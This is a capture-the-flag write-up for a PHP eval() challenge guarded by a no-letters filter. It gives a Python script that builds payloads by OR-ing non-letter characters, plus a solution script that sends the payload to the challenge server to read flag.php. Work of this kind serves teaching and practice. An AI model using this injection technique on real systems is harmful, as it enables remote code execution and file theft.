## Web Warm-up
The main idea finding the flag is to find the flag using PHP injections.

#### Step-1:

We are given a URL [http://69.90.132.196:5003/?view-source](http://69.90.132.196:5003/?view-source) which greets us with this PHP script. We want to get contents of a file `flag.php` in this task.

The PHP script is as follows:
```php
<?php
if(isset($_GET['view-source'])){
    highlight_file(__FILE__);
    die();
}

if(isset($_GET['warmup'])){
    if(!preg_match('/[A-Za-z]/is',$_GET['warmup']) && strlen($_GET['warmup']) <= 60) {
    eval($_GET['warmup']);
    }else{
        die("Try harder!");
    }
}else{
    die("No param given");
}
?>
```
#### Step-2:
The PHP code is executed and when `eval()` function is execute, the parameter which we need to take care is `warmup`.

We can send this payload as `warmup`, but written as some operation of 2 strings that don't use any alphabets.

#### Step-3:

The following `Gen.py` will help to generate such payloads.

```py
#!/usr/bin/env python
from rich import print
import string

pay = "readfile('flag.php');"
w = {c:[] for c in pay}
cand = '0123456789!#$%&()*+,-./:;<=>?@[]^_`{|}~"\''
for c in cand:
    if c not in string.ascii_letters:
        for d in cand:
            if d not in string.ascii_letters:
                f = chr(ord(c)|ord(d))
                if f in w and not w[f]:
                    w[f].append((c, d))

print(w)
one = []
two = []
for c in pay:
    one.append(w[c][0][0])
    two.append(w[c][0][1])
print(f'"{"".join(one)}"|"{"".join(two)}"')
```

#### Step-4:

When we execute it in terminal using `python3 Gen.py` we obtain the following result:

```json
{
    "'": [('!', '&')],
    '(': [('(', '(')],
    ')': [('!', '(')],
    '.': [('$', '*')],
    ';': [('0', '+')],
    'a': [('!', '@')],
    'd': [('$', '@')],
    'e': [('%', '@')],
    'f': [('&', '@')],
    'g': [('@', "'")],
    'h': [('(', '@')],
    'i': [(')', '@')],
    'l': [(',', '@')],
    'p': [('0', '@')],
    'r': [('2', '@')],
}
"2%!$&),%(!&,!@$0(0!!0"|"@@@@@@@@(&@@@'*@@@&(+"
```
The last line is our payload.

#### Step-5:
Next we use our final `Solution.py` to get the flag.

The code for `Solution.py` would be as follows:

```py
#!/usr/bin/env python

import requests

url = 'http://69.90.132.196:5003/'
payl = {
    'warmup': r"""
("2%!$&),%"|"@@@@@@@@")("&,!@$0(0"|"@@@'*@@@"); #Payloads produced before inserted here.
""".strip()
}
r = requests.get(url, params=payl)
print(r.text.split('"')[1])
```
#### Step-6:
Finally when we execute this by `python3 Solution.py` we get the flag.


#### Step-7:
Finally, the flag is:
`ASIS{w4rm_up_y0ur_br4in}`

###### Definitely, not a Warm Up xD. 
